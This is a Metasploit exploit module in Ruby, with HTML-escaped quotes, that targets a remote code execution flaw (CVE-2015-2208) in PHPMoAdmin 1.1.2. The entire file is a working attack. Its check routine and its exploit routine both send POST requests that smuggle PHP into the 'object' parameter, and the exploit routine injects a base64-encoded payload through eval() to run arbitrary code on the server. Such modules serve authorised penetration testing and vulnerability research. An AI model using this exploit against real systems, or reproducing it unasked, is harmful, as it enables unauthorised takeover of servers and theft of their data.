# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;


class Metasploit4 < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;PHPMoAdmin 1.1.2 Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary PHP command execution vulnerability due to a
        dangerous use of eval() in PHPMoAdmin.
      },
      &#039;Author&#039;         =>
        [
          &#039;Pichaya Morimoto pichaya[at]ieee.org&#039;, # Public PoC
          &#039;Ricardo Jorge Borges de Almeida <ricardojba1[at]gmail.com>&#039;, # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2015-2208&#039; ],
          [ &#039;EDB&#039;, &#039;36251&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2015/Mar/19&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/oss-sec/2015/q1/743&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;PHPMoAdmin&#039;, { }  ],
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 03 2015&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, "The URI path of the PHPMoAdmin page", "/"])
      ], self.class)
  end

  def check
    testrun = Rex::Text::rand_text_alpha(10)
    res = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri,&#039;moadmin.php&#039;),
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;vars_post&#039; =>
      {
        &#039;object&#039;  => "1;echo &#039;#{testrun}&#039;;exit",
      }
    })

    if res and res.body.include?(testrun)
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit

    print_status("Executing payload...")

    res = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri,&#039;moadmin.php&#039;),
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;vars_post&#039; =>
      {
        &#039;object&#039;  => "1;eval(base64_decode(&#039;#{Rex::Text.encode_base64(payload.encoded)}&#039;));exit"
      }
    })

  end
end

